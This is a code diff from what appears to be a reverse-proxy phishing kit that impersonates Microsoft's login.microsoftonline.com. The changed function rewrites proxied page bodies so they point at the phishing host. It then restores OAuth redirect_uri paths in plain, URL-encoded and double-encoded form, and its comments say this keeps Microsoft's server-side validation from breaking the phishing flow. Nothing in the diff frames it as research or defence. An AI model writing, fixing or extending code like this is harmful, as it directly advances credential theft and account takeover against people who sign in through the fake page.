@@ -718,22 +718,29 @@ async function maybeRewriteBody(resp, contentType, hostRegex, clientHost) {
   try {
     let text = await resp.text();
 
-    // Protect redirect_uri values from being rewritten.
-    // Microsoft validates redirect_uri server-side — it MUST point to the real domain,
-    // not the phishing domain. We use placeholders to preserve them through the rewrite.
-    const redirectPlaceholders = [];
-    text = text.replace(/redirect_uri[=:]\s*["']?(https?%3A%2F%2F[^&"'\s]+|https?:\/\/[^&"'\s]+)/gi, (match) => {
-      const placeholder = `__REDIR_PRESERVE_${redirectPlaceholders.length}__`;
-      redirectPlaceholders.push(match);
-      return placeholder;
-    });
-
     // Perform the blanket host rewrite
     text = text.replace(hostRegex, clientHost);
 
-    // Restore protected redirect_uri values
-    for (let i = 0; i < redirectPlaceholders.length; i++) {
-      text = text.replace(`__REDIR_PRESERVE_${i}__`, redirectPlaceholders[i]);
+    // Post-rewrite: restore redirect_uri values that were incorrectly rewritten.
+    // Microsoft validates redirect_uri server-side — it MUST point to the real domain.
+    // The blanket rewrite replaces login.microsoftonline.com → phishing domain everywhere,
+    // including inside redirect_uri values (in any format: snake_case, camelCase, URL-encoded).
+    // Fix: restore known redirect_uri paths back to the real domain after rewriting.
+    const realHost = 'login.microsoftonline.com';
+    const redirectPaths = [
+      '/common/oauth2/nativeclient',
+      '/common/oauth2/v2.0/nativeclient',
+      '/organizations/oauth2/nativeclient',
+    ];
+    for (const path of redirectPaths) {
+      // Plain: https://192.168.1.128/common/oauth2/nativeclient
+      text = text.replaceAll(clientHost + path, realHost + path);
+      // URL-encoded: https%3A%2F%2F192.168.1.128%2Fcommon%2Foauth2%2Fnativeclient
+      const encodedPhishing = encodeURIComponent('https://' + clientHost + path);
+      const encodedReal = encodeURIComponent('https://' + realHost + path);
+      text = text.replaceAll(encodedPhishing, encodedReal);
+      // Double-encoded (sometimes seen in nested URL params)
+      text = text.replaceAll(encodeURIComponent(encodedPhishing), encodeURIComponent(encodedReal));
     }
 
     return text;
